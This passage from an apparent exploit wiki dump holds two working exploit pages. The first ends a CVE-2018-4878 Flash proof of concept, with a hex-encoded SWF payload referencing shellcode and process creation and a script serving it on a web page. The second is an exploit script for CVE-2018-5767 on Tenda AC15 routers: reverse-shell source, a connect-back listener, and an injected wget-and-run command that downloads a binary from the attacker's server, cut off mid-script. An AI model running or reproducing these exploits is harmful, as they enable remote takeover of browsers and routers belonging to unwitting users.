C\xD4\xF0\x04\x47\x00\x00\xBF\x14\xF8\x00\x00\x00\x01\x00\x00\x00\x6D\x78\x2F\x63\x6F\x72\x65\x2F\x6D\x78\x5F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x00\x10\x00\x2E\x00\x00\x00\x00\x0A\x43\x45\x3A\x5C\x64\x65\x76\x5C\x34\x2E\x79\x5C\x66\x72\x61\x6D\x65\x77\x6F\x72\x6B\x73\x5C\x70\x72\x6F\x6A\x65\x63\x74\x73\x5C\x66\x72\x61\x6D\x65\x77\x6F\x72\x6B\x5C\x73\x72\x63\x3B\x6D\x78\x5C\x63\x6F\x72\x65\x3B\x6D\x78\x5F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2E\x61\x73\x00\x07\x6D\x78\x2E\x63\x6F\x72\x65\x0B\x6D\x78\x5F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x2A\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F\x32\x30\x30\x36\x2F\x66\x6C\x65\x78\x2F\x6D\x78\x2F\x69\x6E\x74\x65\x72\x6E\x61\x6C\x00\x06\x6E\x61\x6D\x65\x5F\x31\x06\x6E\x61\x6D\x65\x5F\x32\x06\x6E\x61\x6D\x65\x5F\x37\x04\x16\x03\x08\x05\x16\x06\x00\x05\x07\x01\x04\x07\x03\x07\x07\x03\x08\x07\x03\x09\x01\x00\x00\x02\x00\x00\x00\x01\x00\x01\x01\x06\x00\x00\x02\x08\x01\x00\x08\x01\x01\x02\x10\xD0\x10\x05\x00\x00\x40\x06\x41\x06\x03\x30\xF1\x01\xF0\x0C\x47\x00\x00\xBF\x14\x42\x0D\x00\x00\x01\x00\x00\x00\x67\x61\x64\x67\x65\x74\x00\x10\x00\x2E\x00\x05\x00\x80\x80\x80\x04\xFF\xFF\x03\x80\x80\x04\x00\x02\x00\x00\x00\x00\xE0\xFF\xEF\x41\x79\x06\x67\x61\x64\x67\x65\x74\x07\x50\x72\x69\x6D\x69\x74\x31\x02\x1E\x18\x00\x3B\x43\x3A\x5C\x55\x73\x65\x72\x73\x5C\x4D\x69\x68\x61\x5C\x41\x64\x6F\x62\x65\x4D\x69\x6E\x65\x50\x6F\x43\x5F\x74\x72\x79\x69\x6E\x67\x54\x6F\x45\x76\x61\x64\x65\x53\x65\x63\x53\x6F\x6C\x75\x74\x69\x6F\x6E\x73\x66\x6C\x61\x36\x2E\x61\x73\x06\x70\x61\x72\x61\x6D\x31\x04\x72\x65\x73\x74\x10\x67\x61\x64\x67\x65\x74\x2F\x66\x6C\x61\x73\x68\x31\x30\x30\x30\x04\x75\x69\x6E\x74\x09\x67\x61\x64\x67\x65\x74\x30\x24\x30\x07\x66\x6C\x61\x73\x68\x33\x32\x07\x66\x6C\x61\x73\x68\x33\x35\x07\x66\x6C\x61\x73\x68\x32\x31\x05\x45\x72\x72\x6F\x72\x08\x70\x6F\x73\x69\x74\x69\x6F\x6E\x0C\x72\x65\x61\x64\x55\x54\x46\x42\x79\x74\x65\x73\x0B\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65\x21\x68\x74\x74\x70\x3A\x2F\x2F\x61\x64\x6F\x62\x65\x2E\x63\x6F\x6D\x2F\x41\x53\x33\x2F\x32\x30\x30\x36\x2F\x62\x75\x69\x6C\x74\x69\x6E\x01\x6B\x00\x01\x6E\x01\x65\x00\x00\x01\x6C\x07\x72\x65\x61\x64\x55\x54\x46\x01\x76\x00\x01\x75\x00\x01\x70\x00\x01\x74\x00\x01\x63\x01\x72\x00\x00\x00\x00\x01\x73\x00\x02\x62\x30\x01\x62\x06\x76\x61\x72\x5F\x31\x32\x04\x73\x69\x7A\x65\x03\x6F\x66\x74\x02\x66\x74\x07\x67\x61\x64\x67\x65\x74\x33\x03\x69\x6E\x74\x0E\x67\x61\x64\x67\x65\x74\x2F\x67\x61\x64\x67\x65\x74\x30\x06\x70\x61\x72\x61\x6D\x32\x06\x70\x61\x72\x61\x6D\x33\x07\x5F\x6C\x6F\x63\x31\x30\x5F\x06\x5F\x6C\x6F\x63\x34\x5F\x06\x5F\x6C\x6F\x63\x35\x5F\x06\x5F\x6C\x6F\x63\x36\x5F\x06\x5F\x6C\x6F\x63\x37\x5F\x06\x5F\x6C\x6F\x63\x38\x5F\x06\x5F\x6C\x6F\x63\x39\x5F\x07\x5F\x6C\x6F\x63\x31\x31\x5F\x07\x5F\x6C\x6F\x63\x31\x32\x5F\x09\x66\x6C\x61\x73\x68\x31\x30\x30\x30\x07\x66\x6C\x61\x73\x68\x37\x30\x06\x56\x65\x63\x74\x6F\x72\x0C\x67\x61\x64\x67\x65\x74\x2E\x61\x73\x24\x31\x35\x06\x50\x72\x69\x6D\x69\x74\x0B\x5F\x5F\x41\x53\x33\x5F\x5F\x2E\x76\x65\x63\x07\x66\x6C\x61\x73\x68\x33\x34\x07\x66\x6C\x61\x73\x68\x33\x36\x05\x41\x72\x72\x61\x79\x04\x63\x61\x6C\x6C\x05\x61\x70\x70\x6C\x79\x0E\x67\x61\x64\x67\x65\x74\x2F\x67\x61\x64\x67\x65\x74\x31\x09\x66\x6C\x61\x73\x68\x32\x30\x24\x31\x09\x75\x6E\x64\x65\x66\x69\x6E\x65\x64\x07\x4D\x61\x69\x6E\x45\x78\x70\x06\x64\x61\x74\x61\x31\x34\x0F\x72\x65\x61\x64\x55\x6E\x73\x69\x67\x6E\x65\x64\x49\x6E\x74\x04\x70\x75\x73\x68\x06\x6C\x65\x6E\x67\x74\x68\x08\x6D\x65\x74\x68\x6F\x64\x5F\x34\x08\x6D\x65\x74\x68\x6F\x64\x5F\x35\x09\x66\x6C\x61\x73\x68\x32\x30\x30\x33\x09\x66\x6C\x61\x73\x68\x32\x30\x30\x35\x07\x67\x61\x64\x67\x65\x74\x34\x07\x67\x61\x64\x67\x65\x74\x37\x07\x67\x61\x64\x67\x65\x74\x38\x07\x67\x61\x64\x67\x65\x74\x39\x03\x72\x65\x73\x09\x66\x6C\x61\x73\x68\x32\x30\x30\x34\x06\x53\x74\x72\x69\x6E\x67\x0E\x67\x61\x64\x67\x65\x74\x2F\x66\x6C\x61\x73\x68\x32\x30\x0D\x67\x61\x64\x67\x65\x74\x2F\x67\x61\x64\x67\x65\x74\x17\x5F\x5F\x67\x6F\x5F\x74\x6F\x5F\x64\x65\x66\x69\x6E\x69\x74\x69\x6F\x6E\x5F\x68\x65\x6C\x70\x03\x70\x6F\x73\x03\x31\x34\x35\x03\x31\x37\x37\x03\x32\x39\x32\x03\x33\x38\x32\x04\x33\x32\x31\x32\x07\x66\x6C\x61\x73\x68\x32\x30\x04\x34\x34\x31\x34\x06\x4F\x62\x6A\x65\x63\x74\x1C\x5F\x5F\x67\x6F\x5F\x74\x6F\x5F\x63\x74\x6F\x72\x5F\x64\x65\x66\x69\x6E\x69\x74\x69\x6F\x6E\x5F\x68\x65\x6C\x70\x03\x32\x31\x35\x02\x39\x33\x00\x06\x6E\x61\x6D\x65\x5F\x31\x06\x6E\x61\x6D\x65\x5F\x32\x06\x6E\x61\x6D\x65\x5F\x37\x02\x63\x72\x02\x6E\x65\x0C\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x64\x6C\x6C\x0E\x76\x69\x72\x74\x75\x61\x6C\x70\x72\x6F\x74\x65\x63\x74\x0E\x63\x72\x65\x61\x74\x65\x70\x72\x6F\x63\x65\x73\x73\x61\x08\x6D\x65\x74\x68\x6F\x64\x5F\x32\x08\x6D\x65\x74\x68\x6F\x64\x5F\x32\x11\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65\x73\x73\x46\x75\x6E\x63\x08\x66\x69\x6E\x64\x66\x75\x6E\x63\x3A\x05\x01\x16\x04\x17\x04\x08\x12\x05\x42\x18\x01\x1A\x01\x1A\x43\x16\x44\x16\x6C\x16\x6C\x17\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x16\x6C\x06\x09\x01\x02\x03\x04\x05\x06\x07\x08\x09\x08\x01\x02\x03\x04\x05\x06\x07\x08\x01\x03\x09\x01\x0A\x0C\x04\x05\x06\x07\x08\x09\x08\x01\x0A\x0C\x04\x05\x06\x07\x08\x67\x07\x02\x09\x07\x03\x0B\x07\x03\x0C\x07\x03\x0D\x07\x02\x0E\x07\x03\x75\x07\x02\x0F\x07\x02\x10\x07\x04\x11\x07\x02\x1A\x07\x03\x02\x07\x02\x16\x07\x03\x2B\x07\x03\x2C\x07\x03\x2D\x07\x03\x2E\x07\x03\x2F\x07\x03\x30\x07\x03\x31\x07\x03\x23\x07\x02\x32\x07\x03\x3F\x07\x02\x40\x09\x41\x01\x07\x09\x41\x1D\x19\x01\x01\x1B\x02\x07\x03\x45\x07\x03\x46\x07\x02\x47\x07\x04\x48\x07\x04\x49\x07\x02\x4C\x07\x02\x4D\x07\x02\x4E\x07\x02\x4F\x07\x04\x50\x07\x02\x51\x07\x03\x52\x07\x03\x53\x07\x03\x54\x07\x03\x29\x07\x03\x55\x07\x03\x56\x07\x03\x57\x07\x03\x58\x07\x03\x59\x07\x03\x5A\x07\x03\x5B\x07\x02\x5C\x07\x03\x66\x07\x03\x01\x07\x02\x43\x09\x01\x03\x07\x02\x68\x07\x0A\x6D\x07\x0A\x6E\x07\x0A\x6F\x07\x0C\x66\x07\x0A\x0E\x07\x0A\x16\x07\x0A\x47\x07\x0A\x4C\x07\x0A\x09\x1D\x19\x01\x40\x07\x0A\x4D\x07\x0A\x4E\x07\x0A\x0F\x07\x0A\x4F\x07\x0A\x51\x09\x41\x04\x1D\x19\x01\x40\x07\x0C\x46\x07\x0C\x52\x07\x0C\x53\x07\x0C\x0C\x07\x0C\x3F\x07\x0C\x0B\x07\x0C\x45\x07\x0C\x02\x07\x0A\x40\x1D\x19\x01\x40\x1B\x05\x07\x0A\x1A\x1D\x19\x01\x40\x1D\x19\x01\x40\x07\x0C\x0D\x07\x0C\x76\x07\x0A\x10\x1D\x19\x01\x40\x1D\x19\x01\x40\x1D\x19\x01\x40\x1D\x19\x01\x40\x1D\x19\x01\x40\x07\x0C\x77\x1D\x19\x01\x40\x1D\x19\x01\x40\x1D\x19\x01\x40\x1D\x19\x01\x40\x07\x0C\x78\x1D\x19\x01\x40\x1D\x19\x01\x40\x07\x00\x00\x04\x00\x01\x00\x40\x08\x8C\x01\x01\x03\x06\x00\x40\x33\x02\x03\x00\x40\x40\x40\x4A\x80\x06\x34\x35\x00\x00\x5D\x02\x00\x00\x5E\x00\x00\x00\x04\x00\x08\x5F\x01\x60\x61\x5F\x01\x60\x62\x5F\x01\x60\x63\x5F\x01\x60\x64\x5F\x01\x60\x65\x5F\x01\x60\x67\x69\x01\x60\x6A\x5F\x01\x60\x6B\x01\x34\x35\x09\x06\x00\x05\x00\x00\x06\x5F\x40\x01\x40\x00\x01\x00\x06\x40\x02\x01\x00\x01\x01\x4D\x51\x03\x01\x01\x02\x64\x51\x04\x02\x01\x03\x4B\x51\x05\x03\x01\x04\x3B\x51\x06\x04\x01\x05\x01\x06\x01\x34\x44\x00\x00\x02\x06\x07\x07\x00\x08\x01\x04\x05\x0D\xD0\x30\xEF\x01\x02\x00\x09\xEF\x01\x03\x01\x0A\x47\x00\x00\x01\x08\x03\x04\x05\x01\x47\x00\x00\x02\x0C\x03\x05\x0A\xA4\x06\xD0\x30\x57\x2A\xD5\x30\x65\x01\x24\x00\x74\x6D\x01\x65\x01\x24\x00\x74\x6D\x02\xF0\x19\x65\x01\x24\x00\x74\x6D\x03\x65\x01\x24\x00\x74\x6D\x04\xF0\x1B\x65\x01\x24\x00\x74\x6D\x05\xF0\x1C\x65\x01\x24\x00\x74\x6D\x06\x65\x01\x24\x00\x74\x6D\x07\xF0\x1E\x65\x01\x24\x00\x73\x6D\x08\x65\x01\x5D\x4E\x5D\x4C\x5D\x57\x66\x57\x46\x4C\x01\x46\x4E\x01\x2F\x01\xA8\x74\x6D\x01\x65\x01\x65\x01\x6C\x01\x2D\x02\xA1\x74\x6D\x02\x10\x3B\x00\x00\x09\xF0\x26\x5D\x4E\x65\x01\x6C\x02\x46\x4E\x01\x2D\x03\xA8\x25\xCD\xB4\x01\x14\x0D\x00\x00\xF0\x28\x65\x01\x24\x00\x74\x6D\x01\x10\x22\x00\x00\x65\x01\x6C\x03\x91\x74\x65\x01\x2B\x6D\x03\x65\x01\x65\x01\x6C\x02\x2D\x04\xA1\x74\x6D\x02\x65\x01\x6C\x03\x25\x80\x04\x15\xBA\xFF\xFF\x65\x01\x6C\x01\x76\x11\x04\x00\x00\x10\x0A\x00\x00\xF0\x30\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\xF0\x32\x5E\x58\x65\x01\x6C\x02\x61\x58\xF0\x33\x65\x01\x65\x01\x6C\x02\x5D\x4E\x65\x01\x6C\x02\x24\x3C\xA0\x46\x4E\x01\xA0\x74\x6D\x01\x5D\x4E\x65\x01\x6C\x01\x46\x4E\x01\x25\xD0\x8A\x01\x14\x04\x00\x00\x10\x0A\x00\x00\xF0\x36\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\x65\x01\x5D\x4E\x65\x01\x6C\x01\x25\x84\x01\xA0\x46\x4E\x01\x74\x6D\x04\xF0\x39\x65\x01\x65\x01\x6C\x02\x5D\x4E\x65\x01\x6C\x01\x25\x80\x01\xA0\x46\x4E\x01\xA0\x74\x6D\x01\x65\x01\x24\x03\x24\x04\xA2\x74\x6D\x03\x10\x70\x00\x00\x09\x5D\x57\x66\x57\x65\x01\x6C\x02\x5D\x4E\x65\x01\x6C\x01\x65\x01\x6C\x03\xA0\x46\x4E\x01\xA0\x61\x44\x5D\x57\x66\x57\x24\x0C\x46\x59\x01\x46\x09\x00\x2C\x72\x14\x35\x00\x00\x65\x01\x5D\x4E\x65\x01\x6C\x01\x65\x01\x6C\x03\xA0\x24\x03\x24\x04\xA2\xA1\x46\x4E\x01\x74\x6D\x05\x65\x01\x5D\x4E\x65\x01\x6C\x01\x65\x01\x6C\x03\xA0\x24\x04\xA0\x46\x4E\x01\x74\x6D\x06\xF0\x42\x10\x1B\x00\x00\x65\x01\x65\x01\x6C\x03\x24\x05\x24\x04\xA2\xA0\x74\x6D\x03\x65\x01\x6C\x03\x65\x01\x6C\x04\x15\x84\xFF\xFF\x65\x01\x6C\x05\x24\x00\xAB\x76\x2A\x76\x11\x09\x00\x00\x29\x65\x01\x6C\x06\x24\x00\xAB\x76\x11\x04\x00\x00\x10\x0A\x00\x00\xF0\x48\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\xF0\x4A\x65\x01\x65\x01\x6C\x05\x65\x01\x6C\x02\xA0\x74\x6D\x05\xF0\x4B\x65\x01\x24\x00\x74\x6D\x03\x10\xE9\x00\x00\x09\xF0\x4E\x65\x01\x5D\x4E\x65\x01\x6C\x05\x46\x4E\x01\x74\x6D\x01\x65\x01\x6C\x01\x24\x00\x14\x0A\x00\x00\xF0\x51\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\x5D\x57\x66\x57\x65\x01\x6C\x02\x65\x01\x6C\x01\xA0\x61\x44\x5D\x57\x66\x57\x46\x54\x00\x46\x09\x00\x2C\x73\x14\x38\x00\x00\xF0\x56\x65\x01\x5D\x4E\x65\x01\x6C\x02\x65\x01\x6C\x06\xA0\x65\x01\x6C\x03\x24\x04\xA2\xA0\x46\x4E\x01\x74\x6D\x07\xF0\x57\x65\x01\x6C\x08\xC0\x73\x65\x01\x2B\x6D\x08\x65\x01\x6C\x08\x24\x01\x0E\x58\x00\x00\x10\x7E\x00\x00\x5D\x57\x66\x57\x65\x01\x6C\x02\x65\x01\x6C\x01\xA0\x61\x44\x5D\x57\x66\x57\x46\x54\x00\x46\x09\x00\x2C\x74\x13\x04\x00\x00\x10\x31\x00\x00\x5E\x5F\x5D\x4E\x65\x01\x6C\x02\x65\x01\x6C\x06\xA0\x65\x01\x6C\x03\x24\x04\xA2\xA0\x46\x4E\x01\x61\x5F\xF0\x63\x65\x01\x6C\x08\xC0\x73\x65\x01\x2B\x6D\x08\x65\x01\x6C\x08\x24\x01\x17\x2A\x00\x00\x65\x01\x6C\x03\x91\x74\x65\x01\x2B\x6D\x03\xF0\x6B\x65\x01\x65\x01\x6C\x05\x24\x04\xA0\x74\x6D\x05\xF0\x4C\x65\x01\x6C\x03\x25\x80\x02\x0C\x04\x00\x00\x10\x06\xFF\xFF\x65\x01\x6C\x07\x48\xF0\x6F\x10\x17\x00\x00\xD0\x30\xD1\x30\x5A\x00\x2A\xD6\x2A\x30\x2B\x6D\x01\xF0\x71\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\x24\x00\x48\x01\x46\x84\x06\x8A\x06\x3C\x3D\x08\x0D\x00\x01\x01\x00\x0E\x00\x02\x01\x00\x0F\x00\x03\x01\x00\x10\x00\x04\x01\x00\x11\x00\x05\x01\x00\x12\x00\x06\x01\x00\x13\x00\x07\x01\x00\x14\x00\x08\x15\x00\x03\x0D\x0D\x04\x05\x86\x03\xD0\x30\x24\x00\x74\x63\x04\x5D\x4D\x46\x4D\x00\x29\x5D\x4C\x5D\x4D\x66\x4D\x46\x4C\x01\x74\x63\x05\xF0\x7C\x5D\x4E\x5D\x4E\x5D\x4E\x62\x05\x24\x08\xA0\x46\x4E\x01\x24\x14\xA0\x46\x4E\x01\x24\x04\xA0\x46\x4E\x01\x5D\x51\x66\x51\x96\x96\x12\x08\x00\x00\x25\xBC\x01\x82\x10\x04\x00\x00\x25\xB0\x01\x82\xA0\x74\x63\x06\xF0\x7D\x5D\x4E\x62\x06\x46\x4E\x01\x2D\x04\x15\x04\x00\x00\x10\x0A\x00\x00\xF0\x7F\x62\x06\x24\x04\xA0\x74\x63\x06\xF0\x81\x01\x5D\x4E\x62\x06\x46\x4E\x01\x74\x63\x06\xF0\x82\x01\x5D\x4E\x62\x06\x46\x4E\x01\x74\x63\x07\xF0\x83\x01\x5D\x4E\x62\x05\x24\x1C\xA0\x46\x4E\x01\x74\x63\x08\xF0\x84\x01\x5D\x4E\x62\x05\x24\x20\xA0\x46\x4E\x01\x74\x63\x09\xF0\x85\x01\x5D\x47\x66\x47\x5D\x40\x66\x40\x53\x01\x25\x80\x02\x42\x01\x80\x5A\x63\x0A\x10\x24\x00\x00\x09\xF0\x88\x01\x62\x0A\x62\x04\x5D\x4E\x62\x07\x25\x80\x01\xA1\x62\x04\x24\x04\xA2\xA0\x46\x4E\x01\x61\x53\xF0\x89\x01\x62\x04\x91\x74\x63\x04\xF0\x86\x01\x62\x04\x25\x80\x02\x0C\x04\x00\x00\x10\xCC\xFF\xFF\xF0\x8B\x01\x62\x0A\x24\x20\x24\x07\xA0\xD1\x61\x53\xF0\x8C\x01\x5D\x4F\x62\x05\x24\x1C\xA0\xD2\x46\x4F\x02\x29\xF0\x8D\x01\x5D\x4F\x62\x05\x24\x20\xA0\xD3\x46\x4F\x02\x29\xF0\x8E\x01\x5D\x4F\x62\x06\x5D\x49\x62\x0A\x46\x49\x01\x25\x80\x01\xA0\x46\x4F\x02\x29\xF0\x8F\x01\x5D\x3E\x24\x41\x4A\x3E\x01\x80\x3E\x63\x0B\xF0\x90\x01\x5D\x4D\x66\x4D\x66\x1F\x20\x62\x0B\x46\x20\x02\x82\x63\x0C\xF0\x91\x01\x5D\x4F\x62\x06\x62\x07\x46\x4F\x02\x29\xF0\x92\x01\x5D\x4F\x62\x05\x24\x1C\xA0\x62\x08\x46\x4F\x02\x29\xF0\x93\x01\x5D\x4F\x62\x05\x24\x20\xA0\x62\x09\x46\x4F\x02\x29\xF0\x94\x01\x47\x00\x00\x04\x0C\x03\x05\x0A\x92\x03\xD0\x30\x57\x2A\xD5\x30\x65\x01\x24\x00\x6D\x02\xF0\x98\x01\x65\x01\x20\x80\x3E\x6D\x01\xF0\x99\x01\x65\x01\x20\x80\x65\x6D\x03\xF0\x9F\x01\x65\x01\x5D\x3F\x66\x3F\x82\x6D\x08\xF0\xA0\x01\x65\x01\x20\x85\x6D\x09\xF0\xA4\x01\xF0\xA4\x01\x65\x01\x56\x00\x80\x3E\x6D\x01\xF0\xA5\x01\x5D\x42\x66\x42\x66\x43\x24\x00\x61\x44\xF0\xA6\x01\x65\x01\x24\x00\x73\x6D\x02\x10\x24\x00\x00\x09\xF0\xA7\x01\x65\x01\x6C\x01\x5D\x42\x66\x42\x66\x43\x46\x45\x00\x46\x25\x01\x29\xF0\xA6\x01\x65\x01\x65\x01\x6C\x02\x24\x04\xA0\x73\x6D\x02\x65\x01\x6C\x02\x5D\x42\x66\x42\x66\x43\x66\x46\x15\xCC\xFF\xFF\xF0\xA8\x01\x65\x01\x5D\x47\x66\x47\x5D\x40\x66\x40\x53\x01\x64\x65\x01\x6C\x01\x41\x01\x80\x66\x6D\x03\xF0\xAA\x01\x65\x01\x5D\x49\x65\x01\x6C\x03\x46\x49\x01\x74\x6D\x04\xF0\xAC\x01\x65\x01\x5D\x64\x46\x64\x00\x74\x6D\x05\xF0\xAD\x01\x65\x01\x6C\x05\x24\x00\x13\x04\x00\x00\x10\x0B\x00\x00\xF0\xAF\x01\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\x5D\x4B\x65\x01\x6C\x05\x65\x01\x6C\x04\x65\x01\x6C\x03\x66\x46\x24\x04\xA2\x46\x4B\x03\x29\x65\x01\x5D\x4C\x5D\x4D\x66\x4D\x46\x4C\x01\x74\x6D\x06\xF0\xB4\x01\x65\x01\x5D\x4E\x5D\x4E\x65\x01\x6C\x06\x24\x1C\xA0\x46\x4E\x01\x24\x08\xA0\x46\x4E\x01\x24\x04\xA0\x74\x6D\x06\xF0\xB5\x01\x65\x01\x5D\x4E\x65\x01\x6C\x06\x46\x4E\x01\x74\x6D\x07\xF0\xB6\x01\x5D\x4F\x65\x01\x6C\x06\x65\x01\x6C\x04\x46\x4F\x02\x29\xF0\xB8\x01\x65\x01\x5D\x4D\x66\x4D\x20\x5D\x5F\x66\x5F\x46\x1F\x02\x82\x6D\x08\xF0\xBA\x01\x5D\x4F\x65\x01\x6C\x06\x65\x01\x6C\x07\x46\x4F\x02\x29\x47\x10\x18\x00\x00\xD0\x30\xD1\x30\x5A\x00\x2A\xD6\x2A\x30\x2B\x6D\x01\xF0\xBF\x01\x5D\x3C\x2C\x6C\x4A\x3C\x01\x03\xF0\xC2\x01\x47\x01\x35\xF2\x02\xF6\x02\x3C\x3D\x09\x29\x00\x01\x1E\x00\x2A\x00\x02\x15\x00\x2B\x00\x03\x1A\x00\x2C\x00\x04\x01\x00\x2D\x00\x05\x01\x00\x2E\x00\x06\x01\x00\x2F\x00\x07\x01\x00\x30\x00\x08\x00\x00\x31\x00\x09\x32\x00\x05\x08\x01\x05\x06\x0E\xF1\x05\xF0\x0C\xD0\x30\xF0\x0E\xD0\x49\x00\xF0\x0F\x47\x00\x00\x06\x09\x01\x01\x04\x3D\xD0\x30\x10\x05\x00\x00\x41\x05\x03\x58\x04\xF1\x05\xF0\x07\x5D\x36\x5D\x37\x66\x37\x10\x04\x00\x00\x16\x1F\x00\x00\x30\x5D\x35\x66\x35\x30\x5D\x35\x66\x35\x58\x00\x1D\x26\x11\x06\x00\x00\x47\x70\x45\x0A\x10\xD5\x1D\x68\x34\xF1\x05\xF0\x05\x47\x00\x00\x1C\x13\x02\x00\x02\x00\x73\x68\x65\x6C\x6C\x63\x6F\x64\x42\x79\x74\x65\x73\x00\x00\x00\x4D\x61\x69\x6E\x45\x78\x70\x00\x40\x00\x00\x00"


print "[+] CVE-2018-4878 poc "
print "[x] files created"

swf = "%s.swf" % flash_name
 
html = """
&lt;!DOCTYPE html&gt;
&lt;html&gt;

""" + "&lt;embed src=\"" + swf +  "\"&gt;&lt;/embed&gt;" + """
&lt;/html&gt;
"""
 
f = open("%s" % swf, "wb")
f.write(data)
f.close()
 
f = open("index.html", "wb")
f.write(html)
f.close()


HandlerClass = SimpleHTTPRequestHandler
ServerClass  = BaseHTTPServer.HTTPServer
Protocol     = "HTTP/1.0"


port = 8080
server_address = ('0.0.0.0', port)

HandlerClass.protocol_version = Protocol
httpd = ServerClass(server_address, HandlerClass)

sa = httpd.socket.getsockname()
print "Server ready", sa[0], "port", sa[1], "..."
httpd.serve_forever()
&lt;/pre&gt;</text>
      <sha1>gv58vxvucxr2o36pzxxiwmgbkgznhl0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-5767 Tenda AC15 Router 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1225</id>
    <revision>
      <id>1530</id>
      <timestamp>2021-04-11T02:10:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python # EDB Note ~ Source: https://www.fidusinfosec.com/remote-code-execution-cve-2018-5767/ import urllib2 import struct import time import sock..."</comment>
      <origin>1530</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8259" sha1="ofdwhvkzmeptaswh5jhptz93g34dz0i" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python
# EDB Note ~ Source: https://www.fidusinfosec.com/remote-code-execution-cve-2018-5767/
import urllib2
import struct
import time
import socket
from optparse import *
import SimpleHTTPServer
import SocketServer
import threading
import sys
import os
import subprocess
 
ARM_REV_SHELL = (
"#include &lt;sys/socket.h&gt;\n"
"#include &lt;sys/types.h&gt;\n"
"#include &lt;string.h&gt;\n"
"#include &lt;stdio.h&gt;\n"
"#include &lt;netinet/in.h&gt;\n"
"int main(int argc, char **argv)\n"
"{\n"
"           struct sockaddr_in addr;\n"
"           socklen_t addrlen;\n"
"           int sock = socket(AF_INET, SOCK_STREAM, 0);\n"
 
"           memset(&amp;addr, 0x00, sizeof(addr));\n"
 
"           addr.sin_family = AF_INET;\n"
"           addr.sin_port = htons(%d);\n"
"           addr.sin_addr.s_addr = inet_addr(\"%s\");\n"
 
"           int conn = connect(sock, (struct sockaddr *)&amp;addr,sizeof(addr));\n"
 
"           dup2(sock, 0);\n"
"           dup2(sock, 1);\n"
"           dup2(sock, 2);\n"
 
"           system(\"/bin/sh\");\n"
"}\n"
)
 
REV_PORT = 31337
HTTPD_PORT = 8888
DONE = False
 
"""
* This function creates a listening socket on port
* REV_PORT. When a connection is accepted it updates
* the global DONE flag to indicate successful exploitation.
* It then jumps into a loop whereby the user can send remote
* commands to the device, interacting with a spawned /bin/sh
* process.
"""
def threaded_listener():
            global DONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
           
            host = ("0.0.0.0", REV_PORT)
           
            try:
                        s.bind(host)
            except:
                        print "[+] Error binding to %d" %REV_PORT
                        return -1
 
 
            print "[+] Connect back listener running on port %d" %REV_PORT
           
            s.listen(1)
            conn, host = s.accept()
 
            #We got a connection, lets make the exploit thread aware
            DONE = True
 
            print "[+] Got connect back from %s" %host[0]
            print "[+] Entering command loop, enter exit to quit"
 
            #Loop continuosly, simple reverse shell interface.
            while True:
                        print "#",
                        cmd = raw_input()
                        if cmd == "exit":
                                    break
                        if cmd == '':
                                    continue
 
                        conn.send(cmd + "\n")
 
                        print conn.recv(4096)
 
"""
* Take the ARM_REV_SHELL code and modify it with
* the given ip and port to connect back to.
* This function then compiles the code into an
* ARM binary.
@Param comp_path – This should be the path of the cross-compiler.
@Param my_ip – The IP address of the system running this code.
"""
def compile_shell(comp_path, my_ip):
            global ARM_REV_SHELL
            outfile = open("a.c", "w")
 
            ARM_REV_SHELL = ARM_REV_SHELL%(REV_PORT, my_ip)
           
            outfile.write(ARM_REV_SHELL)
            outfile.close()
 
            compile_cmd = [comp_path, "a.c","-o", "a"]
 
            s = subprocess.Popen(compile_cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
           
            while s.poll() == None:
                        continue
 
            if s.returncode == 0:
                        return True
            else:
                        print "[x] Error compiling code, check compiler? Read the README?"
                        return False
 
"""
* This function uses the SimpleHTTPServer module to create
* a http server that will serve our malicious binary.
* This function is called as a thread, as a daemon process.
"""
def start_http_server():
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            httpd = SocketServer.TCPServer(("", HTTPD_PORT), Handler)
 
            print "[+] Http server started on port %d" %HTTPD_PORT
            httpd.serve_forever()
           
 
"""
* This function presents the actual vulnerability exploited.
* The Cookie header has a password field that is vulnerable to
* a sscanf buffer overflow, we make use of 2 ROP gadgets to
* bypass DEP/NX, and can brute force ASLR due to a watchdog
* process restarting any processes that crash.
* This function will continually make malicious requests to the
* devices web interface until the DONE flag is set to True.
@Param host – the ip address of the target.
@Param port – the port the webserver is running on.
@Param my_ip – The ip address of the attacking system.
"""
def exploit(host, port, my_ip):
            global DONE
            url = "http://%s:%s/goform/exeCommand"%(host, port)
            i = 0
 
            command = "wget http://%s:%s/a -O /tmp/a &amp;&amp; chmod 777 /tmp/a &amp;&amp; /tmp/./a &amp;;" %(my_ip, HTTPD_PORT)
 
            #Guess the same libc base continuosly
            libc_base = ****
            curr_libc = libc_base + (0x7c &lt;&lt; 12)
 
            system = struct.pack("&lt;I", curr_libc + ****)
 
            #: pop {r3, r4, r7, pc}
